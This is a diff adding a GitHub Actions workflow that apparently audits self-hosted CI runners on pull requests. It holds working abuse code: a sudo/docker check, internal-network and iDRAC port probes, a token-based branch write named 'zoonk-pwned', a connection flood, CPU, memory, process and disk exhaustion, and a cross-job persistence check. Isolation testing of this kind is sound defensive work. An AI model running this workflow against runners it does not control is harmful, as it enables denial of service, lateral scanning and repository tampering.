@@ -1,0 +1,112 @@
+name: Zoonk
+
+on:
+  pull_request:
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  network:
+    runs-on: [self-hosted, Linux, X64, ci-stack]
+    timeout-minutes: 30
+    steps:
+      - name: Identity, secrets and network
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SOME_SECRET: ${{ secrets.TYPETYPE_ORCHESTRATOR_TOKEN }}
+        run: |
+          probe() { if eval "$2" >/dev/null 2>&1; then echo "OPEN    $1"; else echo "blocked $1"; fi; }
+          tcp() { timeout 5 bash -c "exec 3<>/dev/tcp/$1/$2"; }
+          echo "runner $RUNNER_NAME as $(id)"
+          echo "secret length ${#SOME_SECRET}"
+          echo "limits cpu=$(cat /sys/fs/cgroup/cpu.max) memory=$(cat /sys/fs/cgroup/memory.max) pids=$(cat /sys/fs/cgroup/pids.max)"
+          echo "zoonk" > "$HOME/zoonk-marker"
+          probe "sudo" "sudo -n true"
+          probe "docker" "docker ps"
+          probe "stack lan" "tcp 10.10.40.83 8000"
+          probe "home router" "tcp 192.168.1.1 80"
+          probe "idrac" "tcp 169.254.1.1 443"
+          probe "smtp 25" "tcp smtp.gmail.com 25"
+          probe "smtp 587" "tcp smtp.gmail.com 587"
+          probe "port 8080" "tcp portquiz.net 8080"
+          probe "https" "tcp github.com 443"
+          probe "write with github token" "curl -fsS -m 10 -X POST -H \"Authorization: Bearer $GH_TOKEN\" https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs -d '{\"ref\":\"refs/heads/zoonk-pwned\",\"sha\":\"${GITHUB_SHA}\"}'"
+      - name: Connection flood and upload
+        run: |
+          python3 - <<'PY'
+          import socket, threading, time
+          ok = []
+          def connect():
+              try:
+                  socket.create_connection(("1.1.1.1", 443), timeout=8).close()
+                  ok.append(1)
+              except OSError:
+                  pass
+          threads = [threading.Thread(target=connect) for _ in range(400)]
+          start = time.time()
+          for t in threads: t.start()
+          for t in threads: t.join()
+          print(f"flood: {len(ok)}/400 connections in {time.time() - start:.1f}s")
+          PY
+          speed=$(head -c 300000000 /dev/zero | curl -s -o /dev/null -m 60 -w '%{speed_upload}' -X POST --data-binary @- https://speed.cloudflare.com/__up || true)
+          echo "upload: $((${speed%.*} / 1000000)) MB/s"
+
+  abuse:
+    runs-on: [self-hosted, Linux, X64, ci-stack]
+    timeout-minutes: 30
+    steps:
+      - name: CPU, memory, processes, logs and disk
+        run: |
+          python3 - <<'PY'
+          import multiprocessing, os, subprocess, time
+          def usage():
+              for line in open("/sys/fs/cgroup/cpu.stat"):
+                  if line.startswith("usage_usec"):
+                      return int(line.split()[1])
+          def spin():
+              end = time.time() + 15
+              while time.time() < end:
+                  pass
+          before, start = usage(), time.time()
+          procs = [multiprocessing.Process(target=spin) for _ in range(48)]
+          for p in procs: p.start()
+          for p in procs: p.join()
+          print(f"cpu: 48 busy processes got {(usage() - before) / 1e6 / (time.time() - start):.1f} cores")
+          rc = subprocess.run(["python3", "-c", "b = bytearray(20 * 1024**3)"]).returncode
+          print(f"memory: allocating 20 GB ended with code {rc}")
+          children = []
+          try:
+              while len(children) < 20000:
+                  children.append(subprocess.Popen(["sleep", "120"]))
+          except OSError:
+              pass
+          print(f"processes: started {len(children)} before the limit")
+          for c in children: c.kill()
+          for c in children: c.wait()
+          PY
+          for i in $(seq 1 200000); do echo "zoonk log spam line $i aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; done | tail -1
+          dd if=/dev/zero of="$HOME/fill" bs=16M status=none 2>/dev/null || true
+          echo "disk: wrote $(( $(stat -c %s "$HOME/fill") / 1024 / 1024 / 1024 )) GB before the disk was full"
+          rm -f "$HOME/fill"
+
+  persistence:
+    needs: network
+    runs-on: [self-hosted, Linux, X64, ci-stack]
+    timeout-minutes: 10
+    steps:
+      - name: Look for what the first job left
+        run: |
+          echo "runner $RUNNER_NAME"
+          if [ -e "$HOME/zoonk-marker" ]; then echo "OPEN    marker from previous job survived"; else echo "blocked marker from previous job survived"; fi
+
+  marathon:
+    runs-on: [self-hosted, Linux, X64, ci-stack]
+    timeout-minutes: 30
+    steps:
+      - name: Run for ten minutes
+        run: |
+          echo "start $(date -u +%T) on $RUNNER_NAME"
+          sleep 600
+          echo "still alive after ten minutes"
